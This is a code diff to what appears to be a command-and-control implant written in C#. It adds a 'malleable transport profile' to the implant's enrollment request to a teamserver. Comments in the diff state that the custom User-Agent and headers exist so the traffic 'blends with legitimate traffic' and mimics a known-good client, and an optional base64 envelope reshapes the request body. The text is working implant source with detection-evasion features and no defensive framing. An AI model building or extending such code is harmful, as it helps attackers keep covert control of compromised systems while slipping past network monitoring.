@@ -105,6 +105,24 @@ internal static class C2
         RSA privateKey,
         X509Certificate2Collection? serverCAs,
         CancellationToken cancellationToken = default)
+        => await EnrollAsync(enrollUrl, stagerToken, privateKey, serverCAs, new TransportProfile(), cancellationToken);
+
+    /// <summary>
+    /// Enrolls and applies the malleable transport profile to the enroll request
+    /// (architecture.md Sec 7, M4.3): the profile's User-Agent and headers are set
+    /// on the request, RequestTimeout bounds the call, and Envelope wraps the JSON
+    /// body as a single base64 string when set to "base64". The enroll path is the
+    /// caller's responsibility (use Config.ResolvedEnrollURL) so the profile's path
+    /// lands on the URL itself. A null/empty profile leaves the request identical
+    /// to the un-profiled shape.
+    /// </summary>
+    public static async Task<Enrollment> EnrollAsync(
+        string enrollUrl,
+        string stagerToken,
+        RSA privateKey,
+        X509Certificate2Collection? serverCAs,
+        TransportProfile profile,
+        CancellationToken cancellationToken = default)
     {
         // Export the public half as a DER SubjectPublicKeyInfo -- exactly what
         // EnrollmentEndpoints reads back via ImportSubjectPublicKeyInfo.
@@ -121,9 +139,35 @@ internal static class C2
             handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) =>
                 PinServerChain(cert, chain, serverCAs);
         }
-        using var http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
+        var timeout = profile.RequestTimeout > TimeSpan.Zero
+            ? profile.RequestTimeout
+            : TransportProfile.DefaultRequestTimeout;
+        using var http = new HttpClient(handler) { Timeout = timeout };
 
-        using var response = await http.PostAsJsonAsync(enrollUrl, body, cancellationToken);
+        // Serialize the body once so the envelope can reshape it: base64 wraps the
+        // JSON as a single string, raw sends the JSON document (the shape
+        // PostAsJsonAsync would have produced).
+        var json = System.Text.Json.JsonSerializer.Serialize(body);
+        var payload = profile.IsBase64Envelope
+            ? ("\"" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(json)) + "\"")
+            : json;
+        var content = new StringContent(payload, System.Text.Encoding.UTF8, "application/json");
+
+        // Apply the malleable profile (architecture.md Sec 7): User-Agent blends
+        // the request with legitimate traffic, and custom headers match a known-
+        // good client shape. Set after Content-Type so a profile cannot drop it; a
+        // profile header named Content-Type still wins explicitly below.
+        if (profile.UserAgent.Length > 0)
+            http.DefaultRequestHeaders.UserAgent.ParseAdd(profile.UserAgent);
+        foreach (var kv in profile.Headers)
+        {
+            if (string.Equals(kv.Key, "Content-Type", StringComparison.OrdinalIgnoreCase))
+                content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue(kv.Value);
+            else
+                content.Headers.Add(kv.Key, kv.Value);
+        }
+
+        using var response = await http.PostAsync(enrollUrl, content, cancellationToken);
         // The teamserver returns 200 on OK and 401 on a token failure, both with
         // an EnrollmentResponse body. Read the body either way.
         var er = await response.Content.ReadFromJsonAsync<EnrollResponse>(cancellationToken: cancellationToken)
